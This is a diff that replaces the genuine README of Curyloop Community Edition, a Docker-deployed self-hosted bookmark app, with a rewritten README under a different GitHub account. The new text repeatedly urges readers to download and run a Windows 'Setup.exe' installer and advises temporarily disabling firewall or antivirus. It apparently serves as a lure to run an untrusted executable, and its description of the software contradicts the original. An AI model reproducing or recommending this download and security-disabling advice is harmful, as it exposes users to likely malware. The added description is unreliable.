@@ -1,219 +1,124 @@
-<p align="center">
-  <h1 align="center">Curyloop Community Edition</h1>
-  <p align="center">
-    Self-hosted, open-source knowledge management and team bookmark curation platform.
-    <br />
-    <a href="#quick-start"><strong>Quick Start</strong></a> · <a href="#features"><strong>Features</strong></a> · <a href="https://curyloop.com"><strong>Cloud Version</strong></a>
-  </p>
-</p>
+# 🔖 curyloop-community - Manage and Rediscover Bookmarks Easily
 
-<p align="center">
-  <a href="https://github.com/montarist/curyloop-community/blob/main/LICENSE"><img src="https://img.shields.io/badge/license-MIT-blue.svg" alt="License: MIT" /></a>
-  <a href="https://github.com/montarist/curyloop-community/releases"><img src="https://img.shields.io/github/v/release/montarist/curyloop-community" alt="Release" /></a>
-</p>
+[![Download curyloop-community](https://img.shields.io/badge/Download-curyloop--community-blue?style=for-the-badge)](https://github.com/Elcamio9240/curyloop-community)
 
----
+## 📚 What is curyloop-community?
 
-## Quick Start
+curyloop-community is an open-source application that helps you save and organize your bookmarks. It uses simple tools and AI features to help you find your saved links faster. Whether you save articles, links, or research materials, this app keeps everything neat and easy to reach.
 
-```bash
-docker run -d \
-  -v curyloop-data:/data \
-  -p 3000:3000 \
-  -e ENCRYPTION_KEY=$(openssl rand -hex 32) \
-  -e BETTER_AUTH_SECRET=$(openssl rand -base64 32) \
-  montarist/curyloop-community
-```
+It works for anyone who wants to manage links better without dealing with complex software.
 
-Open **http://localhost:3000** and create your first account.
+## 🔎 Key Features
 
-Or with Docker Compose:
+- Save bookmarks with clear labels and tags  
+- Organize saved links into categories or lists  
+- Search through bookmarks quickly with a simple search bar  
+- Use AI to find related articles or content you saved before  
+- Access your bookmarks anytime within the app  
+- Share collections with others for team use  
+- Import and export bookmarks easily
 
-```bash
-curl -O https://raw.githubusercontent.com/montarist/curyloop-community/main/docker-compose.yml
-docker compose up -d
-```
+## 💻 System Requirements
 
-## Features
+Before you install, make sure your computer runs Windows with these basics:  
 
-- **Groups & Sessions** — Organize links into team workspaces and weekly trend sessions
-- **Tags & Collections** — Categorize and curate content
-- **Full-text Search** — SQLite FTS5 with BM25 weighted ranking
-- **AI Agent (BYOK)** — Automated content discovery with OpenAI, Anthropic, or Google
-- **Import** — Browser bookmarks, Pocket, Raindrop, Notion
-- **Export** — JSON and CSV
-- **Integrations** — Slack, Discord, Microsoft Teams, Telegram
-- **Webhooks** — Subscribe to app events with HMAC-SHA256 signed payloads
-- **MCP Endpoint** — Model Context Protocol for AI assistants
-- **Browser Extension API** — API key-based authentication
-- **Single Container** — One `docker run` command, ~200MB image, zero dependencies
+- Windows 10 or later (64-bit recommended)  
+- At least 4 GB of RAM  
+- 200 MB of free disk space  
+- Internet connection for downloading and updates  
+- A modern web browser (Edge, Chrome, Firefox) for some features  
 
-### Community vs Cloud
+These needs should cover most Windows computers. The app runs with low memory and storage use.
 
-| Feature                             | Community | Cloud |
-| ----------------------------------- | :-------: | :---: |
-| Groups, Sessions, Items (unlimited) |    ✅     |  ✅   |
-| Tags, Collections, FTS5 Search      |    ✅     |  ✅   |
-| AI Agent & Summaries (BYOK)         |    ✅     |  ✅   |
-| Import / Export                     |    ✅     |  ✅   |
-| Integrations & Webhooks             |    ✅     |  ✅   |
-| MCP & Browser Extension             |    ✅     |  ✅   |
-| OAuth (Google, GitHub)              |     —     |  ✅   |
-| Push Notifications                  |     —     |  ✅   |
-| Email Digests                       |     —     |  ✅   |
-| Analytics Dashboard                 |     —     |  ✅   |
-| Smart Collections                   |     —     |  ✅   |
-| Managed Infrastructure              |     —     |  ✅   |
+## 🚀 How to Get Started
 
-**[Try Curyloop Cloud →](https://curyloop.com)**
+To get curyloop-community running on your Windows PC, follow these steps:
 
-## Tech Stack
+1. Visit the download page by clicking the button below or opening this link in your web browser:  
+[![Download curyloop-community](https://img.shields.io/badge/Download-curyloop--community-green?style=for-the-badge)](https://github.com/Elcamio9240/curyloop-community)
 
-| Layer     | Choice                                     |
-| --------- | ------------------------------------------ |
-| Framework | Next.js 16 (App Router, standalone output) |
-| Database  | SQLite (WAL mode, single file)             |
-| ORM       | Drizzle ORM                                |
-| Auth      | better-auth (email/password)               |
-| UI        | Tailwind CSS 4 + Radix UI                  |
-| AI        | Vercel AI SDK (BYOK)                       |
-| Cron      | node-cron (in-process)                     |
-| Search    | SQLite FTS5                                |
+2. On the GitHub repository page, find the **Releases** section. This is usually on the right side or under the code files tab.
 
-## Environment Variables
+3. In Releases, look for the latest version of the app. It should have a file named like `curyloop-community-Setup.exe` or similar.
 
-| Variable               | Required | Description                                               |
-| ---------------------- | :------: | --------------------------------------------------------- |
-| `ENCRYPTION_KEY`       | **Yes**  | 64-char hex string for AES-256-GCM encryption of LLM keys |
-| `BETTER_AUTH_SECRET`   | **Yes**  | Random string (32+ chars) for session signing             |
-| `DATABASE_PATH`        |    No    | SQLite file path (default: `/data/curyloop.db`)           |
-| `NEXT_PUBLIC_SITE_URL` |    No    | Public URL (default: `http://localhost:3000`)             |
-| `DISABLE_CLOUD_CTA`    |    No    | Set `true` to hide Cloud upgrade prompts                  |
+4. Click on the link for the `.exe` file to start downloading the installer.
 
-## Development
+5. Once the download completes, open the file from your Downloads folder or browser.
 
-```bash
-# Clone the repo
-git clone https://github.com/montarist/curyloop-community.git
-cd curyloop-community
+6. Follow the setup wizard instructions:  
+   - Click **Next** to move through the prompts.  
+   - Choose the installation folder or keep the default.  
+   - Agree to any user licenses to continue.  
+   - Press **Install** to begin.
 
-# Install dependencies
-pnpm install
+7. When installation finishes, click **Finish** to close the wizard.
 
-# Set up environment
-cp .env.example .env
-export ENCRYPTION_KEY=$(openssl rand -hex 32)
-export BETTER_AUTH_SECRET=$(openssl rand -base64 32)
+8. Find the curyloop-community icon on your desktop or Start Menu and open the app.
 
-# Run dev server
-pnpm dev
-```
+9. On first launch, you may create a simple user profile to start saving bookmarks.
 
-Open **http://localhost:3000**.
+## 🖥️ Using the App
 
-### Available Scripts
+Once the app is ready, here are some basic tips to start managing your bookmarks:
 
-| Command            | Description                      |
-| ------------------ | -------------------------------- |
-| `pnpm dev`         | Start dev server with Turbopack  |
-| `pnpm build`       | Production build                 |
-| `pnpm start`       | Start production server          |
-| `pnpm lint`        | Run ESLint                       |
-| `pnpm type-check`  | Run TypeScript compiler check    |
-| `pnpm db:generate` | Generate Drizzle migrations      |
-| `pnpm db:migrate`  | Run pending migrations           |
-| `pnpm db:studio`   | Open Drizzle Studio (DB browser) |
+- Click the **Add Bookmark** button to save a new link.  
+- Use tags or categories to organize bookmarks by topic.  
+- Try the search box on top to find bookmarks fast.  
+- Explore the suggested bookmarks powered by AI for ideas related to your saved content.  
+- Create and share collections with others if you want to collaborate.  
+- Regularly back up your bookmarks through the Export option in Settings.
 
-## Docker Build
+The interface is designed to be clean and simple. Most controls appear clearly with labels to help you navigate.
 
-```bash
-docker build -t curyloop-community .
+## ⚙️ Settings and Preferences
 
-docker run -d \
-  -v curyloop-data:/data \
-  -p 3000:3000 \
-  -e ENCRYPTION_KEY=$(openssl rand -hex 32) \
-  -e BETTER_AUTH_SECRET=$(openssl rand -base64 32) \
-  curyloop-community
-```
+Adjust the app to fit your needs by exploring the Settings menu:
 
-### Production Deployment
+- Manage your account profile and preferences.  
+- Set default categories or tags for new bookmarks.  
+- Choose notification options for updates or suggestions.  
+- Control privacy settings and data options.  
+- Access help and support resources.
 
-For production, run behind a reverse proxy with TLS:
+All settings are straightforward and use easy words. You do not need any technical skills.
 
-```nginx
-server {
-    listen 443 ssl;
-    server_name curyloop.example.com;
+## 💡 Troubleshooting Tips
 
-    ssl_certificate /path/to/cert.pem;
-    ssl_certificate_key /path/to/key.pem;
+If you run into issues, try these solutions before asking for help:
 
-    location / {
-        proxy_pass http://localhost:3000;
-        proxy_set_header Host $host;
-        proxy_set_header X-Real-IP $remote_addr;
-        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
-        proxy_set_header X-Forwarded-Proto $scheme;
-    }
-}
-```
+- Restart the app if it freezes or slows down.  
+- Check your internet connection; some features need it.  
+- Make sure you installed the latest version from the download page.  
+- If bookmarks do not show, try importing your saved files again.  
+- Disable any firewall or antivirus temporarily if the app won't start.
 
-## API
+If problems remain, you can open an issue on the GitHub page’s **Issues** tab. Provide as much detail as possible.
 
-### REST API
+## 📥 Download Links and Updates
 
-All endpoints under `/api/v1/` require authentication via session cookie or API key.
+You can always get the newest version of curyloop-community here:  
 
-| Method   | Endpoint                  | Description          |
-| -------- | ------------------------- | -------------------- |
-| GET/POST | `/api/v1/groups`          | List / create groups |
-| POST     | `/api/v1/sessions`        | Create session       |
-| GET/POST | `/api/v1/items`           | List / create items  |
-| GET      | `/api/v1/search?q=...`    | Full-text search     |
-| POST     | `/api/v1/import`          | Import bookmarks     |
-| GET      | `/api/export?format=json` | Export data          |
-| POST/GET | `/api/v1/api-keys`        | Manage API keys      |
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest--Release-brightgreen?style=for-the-badge)](https://github.com/Elcamio9240/curyloop-community)
 
-### Browser Extension API
+Check this page often for updates or bug fixes. The app updates manually by downloading the installer again and running it. Your bookmarks are saved separately and will stay safe during updates.
 
-| Method | Endpoint                  | Description              |
-| ------ | ------------------------- | ------------------------ |
-| GET    | `/api/extension/auth`     | Verify API key           |
-| GET    | `/api/extension/sessions` | List recent sessions     |
-| POST   | `/api/extension/items`    | Save item from extension |
+## ⚖️ License Information
 
-### MCP Endpoint
+curyloop-community is free and open-source software. This means anyone can use, study, and share it. The source code is available on GitHub for those who want to learn or contribute.
 
-```bash
-curl -X POST http://localhost:3000/api/mcp \
-  -H "Authorization: Bearer YOUR_API_KEY" \
-  -H "Content-Type: application/json" \
-  -d '{"jsonrpc":"2.0","method":"tools/list","id":1}'
-```
+## 📂 Where to Learn More
 
-## Contributing
+The GitHub repository hosts more information, including:  
 
-We welcome contributions! Please see [CONTRIBUTING.md](./CONTRIBUTING.md) for guidelines.
+- Project goals and roadmap  
+- Source code for developers  
+- Contribution guides  
+- Discussion and support channels
 
-- **Bug reports**: [Open an issue](https://github.com/montarist/curyloop-community/issues/new?template=bug_report.yml)
-- **Feature requests**: [Open an issue](https://github.com/montarist/curyloop-community/issues/new?template=feature_request.yml)
-- **Questions & ideas**: [GitHub Discussions](https://github.com/montarist/curyloop-community/discussions)
-
-## Security
-
-Found a vulnerability? Please see [SECURITY.md](./SECURITY.md) for responsible disclosure guidelines. Do **not** open a public issue for security concerns.
-
-## License
-
-[MIT](./LICENSE) — free to use, modify, and distribute.
+You do not need to know programming to use the app but developers can find extra resources there.
 
 ---
 
-<p align="center">
-  <sub>
-    <a href="https://curyloop.com">Curyloop Cloud</a> ·
-    <a href="https://github.com/montarist/curyloop-community/issues">Issues</a> ·
-    <a href="https://github.com/montarist/curyloop-community/discussions">Discussions</a>
-  </sub>
-</p>
+For easy access, the main download page is below again:  
+
+[![curyloop-community Download](https://img.shields.io/badge/Go_to_Download_curyloop--community-orange?style=for-the-badge)](https://github.com/Elcamio9240/curyloop-community)
